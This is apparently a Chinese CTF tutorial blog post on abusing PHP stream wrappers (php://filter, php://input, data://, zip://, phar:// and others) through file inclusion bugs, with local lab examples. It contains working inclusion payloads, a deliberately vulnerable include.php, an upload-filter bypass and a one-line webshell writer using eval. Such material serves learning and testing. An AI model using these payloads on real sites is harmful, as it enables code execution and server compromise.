---
title: PHP伪协议
abbrlink: e3611a41
description: '常见的php伪协议利用'
cover: false
date: 2022-09-23 22:18:17
tags:
  - CTF-Web
categories:
  - CTF
  - Web安全
typora-root-url: ..
---

# 1_概述

PHP 带有很多内置 **URL 风格的封装协议**，可用于类似` fopen()`、` copy()`、` file_exists()` 和` filesize()`的文件系统函数。 除了这些封装协议，还能通过 `stream_wrapper_register()`来注册自定义的封装协议。

支持的协议:

```
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

<br>

***

<br>

# 2_file://协议

用于**访问本地文件系统**，在CTF中通常用来**读取本地文件**
在` include()/require()/include_once()/require_once()`参数可控的情况下，如导入为非`.php`文件，则仍按照`php`语法进行解析，这是`include()`函数所决定的。

此协议能否使用不受`PHP.ini`(php配置文件)中 `allow_url_fopen`和`allow_url_include`两个字段的值的影响

```
allow_url_fopen=on/off
allow_url_include=on/Off
```

`file://`文件系统是php使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径时, 将基于当前的工作目录。

使用实例:

假设`include.php`的代码为:

```
<?php
if(isset($_GET['file']))
{
    include $_GET['file'];
}
?>
```

那么通过`GET`中的`file`变量:

```
http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
```

使用绝对路径来访问`E:\phpStudy\PHPTutorial\WWW\phpinfo.txt`

<br>

```
http://127.0.0.1/include.php?file=./phpinfo.txt
```

使用相对路径来访问当前目录下的`phpinfo.txt`

<br>

```
http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
```

访问一个网络上的地址

<br>

***

<br>

# 3_php://协议

对`PHP.ini`配置文件的要求:

>**`php://filter`** 在 `allow_url_fopen`和`allow_url_include`两个字段的值都是off的情况下也可以使用
>
>**`php://input、 php://stdin、 php://memory 和 php://temp`** 需要`allow_url_include`的值为on

作用: 

访问各个输入/输出流（`I/O streams`），在CTF中经常使用的是`php://filter`和`php://input`，`php://filter`用于**读取源码**，`php://input`用于执行php代码。

<br>

## 3.1_php://filter

>参数解析, 参数之间用`/`来分隔开
>
>| **php://filter 参数**     | **描述**                                                     |
>| ------------------------- | ------------------------------------------------------------ |
>| resource=<要过滤的数据流> | 必须项。它指定了你要筛选过滤的数据流。（必选）               |
>| read=<读链的过滤器>       | 可选项。可以设定一个或多个过滤器名称，以管道符（\|）分隔。（可选） |
>| write=<写链的过滤器>      | 可选项。可以设定一个或多个过滤器名称，以管道符（\|）分隔。（可选） |
>| <;  两个链的过滤器>       | 任何没有以 *read=* 或 *write=* 作前缀的筛选器列表会视情况应用于读或写链。 |

示例1: <span id="meiya_person_03" style='color:black;background:yellow;font-size:16px;font-family:hei'>**(利用cmd.php中名为cmd的变量)**</span>

```
http://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=flag.php
```

效果是读取`flag.php`的源码,并进行`base64`编码之后输出

参数`read`的值为`convert.base64-encode`,这是一个用于`base64`编码的**过滤器**

参数`resource`的值为`flag.php`要读/写的**数据流**

假设有一个名为`hello.php`写了以下内容, 且同目录下有一个名为`flag.php`的文件

<img src="/images/ctf-web02/image-20220923225648738.png" alt="image-20220923225648738" style="zoom:67%;" />

访问`hello.php`的效果:

<img src="/images/ctf-web02/image-20220923225748400.png" alt="image-20220923225748400" style="zoom:67%;" />

再把这里输出的编码后的内容解码出来, 就可以得到`flag.php`的源码内容了

<img src="/images/ctf-web02/image-20220923225849854.png" alt="image-20220923225849854" style="zoom:67%;" />

***

**四类可用的`php://filter`过滤器:**

| **字符串过滤器**  | **作用**                                  |
| ----------------- | ----------------------------------------- |
| string.rot13      | 等同于str_rot13()，rot13变换              |
| string.toupper    | 等同于strtoupper()，转大写字母            |
| string.tolower    | 等同于strtolower()，转小写字母            |
| string.strip_tags | 等同于strip_tags()，去除html、PHP语言标签 |

| **转换过滤器**                                               | **作用**                                               |
| ------------------------------------------------------------ | ------------------------------------------------------ |
| convert.base64-encode  & convert.base64-decode               | 等同于base64_encode()和base64_decode()，base64编码解码 |
| convert.quoted-printable-encode  & convert.quoted-printable-decode | quoted-printable  字符串与 8-bit 字符串编码解码        |

| **压缩过滤器**                     | **作用**                                                     |
| ---------------------------------- | ------------------------------------------------------------ |
| zlib.deflate  & zlib.inflate       | 在本地文件系统中创建  gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 |
| bzip2.compress  & bzip2.decompress | 同上，在本地文件系统中创建  bz2 兼容文件的方法。             |

| **加密过滤器** | **作用**                |
| -------------- | ----------------------- |
| mcrypt.*       | libmcrypt  对称加密算法 |
| mdecrypt.*     | libmcrypt  对称解密算法 |

<br>

<br>

**补充小知识点:**

**`php`伪协议中,在任意位置套一层其他协议,虽然可能会产生报错,但是不影响输出,(无法找到对应的过滤器时就会跳过它),这在payload需要包含一些特殊字符时很好用,例如:**

```
?category=php://filter/meowers/read=convert.base64-encode/resource=flag
?category=php://filter/read=convert.base64-encode/meowers/resource=flag
//这里并不存在的'meowers'可以放在任意位置
```

![image-20221020001536369](/images/ctf-web02/image-20221020001536369.png)

## 3.2_php://input

可以用来执行`POST`数据中的`php`代码

例如:  对于`include.php` 中的`file`变量: 

```
http://127.0.0.1/include.php?file=php://input
```

然后通过`HackBar`插件来POST一段php代码:

```
<?php phpinfo(); ?>
```

效果: 成功执行了上述代码

<img src="/images/ctf-web02/1.jpg" alt="1" style="zoom:67%;" />

如果有权限，还可以通过`POST`写入一句话木马：

```
<?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
```



<br>

***

<br>

# 4_data://协议

自`PHP>=5.2.0`起，可以使用`data://`数据流封装器，以传递相应格式的数据。通常可以**用来执行PHP代码**。一般需要用到`base64编码`传输

条件: `PHP.ini`中

- `allow_url_fopen:on`
- `allow_url_include :on`

用法:

```
data://text/plain,「要执行的php代码」
data://text/plain;base64,「base64编码后要执行的php代码」
```

示例:

`include.php`中, 有`include($file)`

```
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
```

<img src="/images/ctf-web02/2.jpg" alt="2" style="zoom:100%;" />

成功执行了`<?php phpinfo();?>`

***

```
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

<img src="/images/ctf-web02/3.jpg" alt="3" style="zoom:100%;" />

<br>

***

<br>

# 5_zip:// & bzip2:// & zlib:// 协议

条件: `PHP.ini`中

- `allow_url_fopen:on`
- `allow_url_include :off/on`

作用：`zip:// & bzip2:// & zlib:// `均属于压缩流，**可以访问压缩文件中的子文件**，更重要的是**不需要指定后缀名**，可修改为任意后缀：jpg png gif xxx 等等。(将最终希望执行的文件压缩可以绕过很多对文件类型的验证)

示例1:

```
zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（**#编码为%23**）
```

压缩 `phpinfo.txt` 为 `phpinfo.zip` ，压缩包重命名为 `phpinfo.jpg`(绕过验证,假设只允许上传图片) ，并上传

然后访问:

```
http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
```

<img src="/images/ctf-web02/4.jpg" alt="4" style="zoom:100%;" />

​	由此访问了压缩文件内的`phpinfo.txt`

***

示例2:

```
compress.bzip2://file.bz2
```

压缩` phpinfo.txt` 为 `phpinfo.bz2 `并上传（同样支持任意后缀名）

然后访问:

```
http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
```

效果和示例1相同 也访问到了`phpinfo.txt`

***

示例3:

```
compress.zlib://file.gz
```

压缩 `phpinfo.txt` 为 `phpinfo.gz` 并上传（同样支持任意后缀名）

然后访问:

```
http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz
```

效果一样

<br>

***

<br>

# 6_http:// & https:// 协议

条件: `PHP.ini`中

- `allow_url_fopen:on`
- `allow_url_include :on`

作用: 常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。

用法:

```
http://example.com
http://example.com/file.php?var1=val1&var2=val2
http://user:password@example.com
https://example.com
https://example.com/file.php?var1=val1&var2=val2
https://user:password@example.com
```

示例:

```
http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
```

<img src="/images/ctf-web02/5.jpg" alt="5" style="zoom:100%;" />

<br>

***

<br>



# 6_phar://协议

`phar://`协议与`zip://`类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：

```
http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
```

<img src="/images/ctf-web02/6.jpg" alt="6" style="zoom:100%;" />
